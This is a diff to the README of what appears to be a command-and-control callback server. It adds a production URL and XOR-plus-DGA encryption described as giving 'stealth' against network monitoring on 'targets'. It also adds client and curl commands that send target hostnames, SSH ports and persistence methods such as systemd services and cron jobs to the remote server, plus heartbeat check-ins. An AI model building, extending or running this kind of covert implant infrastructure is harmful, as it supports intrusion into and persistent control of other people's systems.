@@ -2,8 +2,11 @@
 
 **TEMPEST Level C Compliant / Post-Quantum Cryptography / Military-Grade Security**
 
+**Production Server**: `https://polygotya.swordintelligence.airforce`
+
 Enhanced security callback server designed for classified environments with:
 - **Post-Quantum Cryptography** (ML-KEM-1024, ML-DSA-87)
+- **XOR Encryption with DGA** (Domain Generation Algorithm key derivation)
 - **SHA-384/512** hashing
 - **User/Password Authentication** with bcrypt
 - **Session Management** with timeout
@@ -29,6 +32,30 @@ Enhanced security callback server designed for classified environments with:
 - **Account Lockout** after 5 failed attempts (30-minute lock)
 - **Role-Based Access Control** (admin, operator)
 - **Multi-Factor Authentication Ready** (framework in place)
+
+### **Callback Encryption (XOR + DGA)**
+- **XOR Cipher** with Domain Generation Algorithm (DGA) key derivation
+- **Time-Based Key Rotation** (24-hour periods by default)
+- **No Hardcoded Keys** - keys generated from DGA seed + date
+- **SHA-256** based key derivation function
+- **Base64 Encoding** for safe transmission
+- **Bidirectional Compatibility** - supports encrypted and legacy unencrypted callbacks
+- **Clock Skew Tolerance** - accepts previous rotation period keys
+- **Lightweight** - no heavy crypto libraries required on targets
+
+#### How DGA Encryption Works:
+1. **Key Generation**: Client and server both generate same key using `DGA_SEED + current_date + SHA-256`
+2. **Encryption**: Client XORs callback data with generated key and Base64 encodes
+3. **Transmission**: Encrypted data sent with `{"encrypted": true, "data": "base64_ciphertext"}`
+4. **Decryption**: Server generates same key (synchronized by time) and decrypts
+5. **Key Rotation**: Keys automatically rotate every 24 hours (configurable)
+
+#### Key Benefits:
+- **No Key Exchange** - DGA eliminates need for key distribution
+- **Automatic Rotation** - new key every rotation period
+- **Simple & Fast** - XOR is extremely fast, works on resource-constrained targets
+- **Obfuscation** - protects callback data from casual network monitoring
+- **Stealth** - encrypted data appears as random Base64, no obvious structure
 
 ### **TEMPEST Level C Compliance**
 - **Amber on Black Display** (FFB000 on 000000) - reduces EMI emissions
@@ -158,6 +185,43 @@ Secondary:       #CC8800 (Dark Amber)
 ### **1. Register Callback (POST /api/register)**
 
 **Authentication**: API Key
+**Encryption**: Optional (recommended)
+**Production URL**: `https://polygotya.swordintelligence.airforce/api/register`
+
+#### **Using Client Script (Recommended - Encrypted)**
+
+```bash
+# Production server with encryption (default)
+python3 client_callback.py --api-key YOUR_API_KEY --auto-detect
+
+# Custom server with encryption
+python3 client_callback.py --server https://custom.example.com --api-key YOUR_API_KEY --auto-detect
+
+# Disable encryption (legacy mode)
+python3 client_callback.py --api-key YOUR_API_KEY --auto-detect --no-encrypt
+
+# Manual data with encryption
+python3 client_callback.py --api-key YOUR_API_KEY \
+    --hostname target-server --os-type linux --ssh-port 22
+```
+
+#### **Manual Encrypted Callback (Advanced)**
+
+Encrypted callbacks use XOR cipher with DGA-derived keys:
+
+```bash
+# Example with encrypted data (client handles encryption automatically)
+curl -X POST \
+  -H "Content-Type: application/json" \
+  -d '{
+    "api_key": "YOUR_API_KEY",
+    "encrypted": true,
+    "data": "BASE64_ENCRYPTED_DATA_HERE"
+  }' \
+  https://polygotya.swordintelligence.airforce/api/register
+```
+
+#### **Manual Unencrypted Callback (Legacy)**
 
 ```bash
 curl -X POST \
@@ -175,7 +239,7 @@ curl -X POST \
     "ssh_implementation": "openssh",
     "persistence_methods": ["systemd_service", "cron_job"]
   }' \
-  https://YOUR_VPS:5000/api/register
+  https://polygotya.swordintelligence.airforce/api/register
 ```
 
 **Enhanced Response** (with PQC):
@@ -193,15 +257,20 @@ curl -X POST \
 ### **2. Heartbeat (POST /api/heartbeat)**
 
 **Authentication**: API Key
+**Production URL**: `https://polygotya.swordintelligence.airforce/api/heartbeat`
 
 ```bash
+# Using client script (recommended)
+python3 client_callback.py --api-key YOUR_API_KEY --heartbeat
+
+# Manual heartbeat
 curl -X POST \
   -H "Content-Type: application/json" \
   -d '{
     "api_key": "YOUR_API_KEY",
     "hostname": "target-server"
   }' \
-  https://YOUR_VPS:5000/api/heartbeat
+  https://polygotya.swordintelligence.airforce/api/heartbeat
 ```
 
 ### **3. Get Callbacks (GET /api/callbacks)**
